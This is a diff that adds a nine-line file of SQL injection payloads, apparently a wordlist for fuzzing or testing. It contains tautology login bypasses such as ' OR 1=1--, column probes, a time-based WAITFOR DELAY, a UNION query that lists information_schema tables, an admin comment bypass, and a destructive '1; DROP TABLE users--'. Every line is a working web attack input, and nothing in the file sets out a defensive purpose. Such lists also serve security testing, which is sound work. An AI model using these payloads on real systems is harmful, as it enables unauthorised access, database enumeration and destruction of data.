@@ -1,0 +1,9 @@
+' OR 1=1--
+" OR "" = "
+' OR 'x'='x
+1' ORDER BY 1--
+1' HAVING 1=1--
+1' WAITFOR DELAY '0:0:5'--
+1; DROP TABLE users--
+1' UNION SELECT null,table_name FROM information_schema.tables--
+admin'--
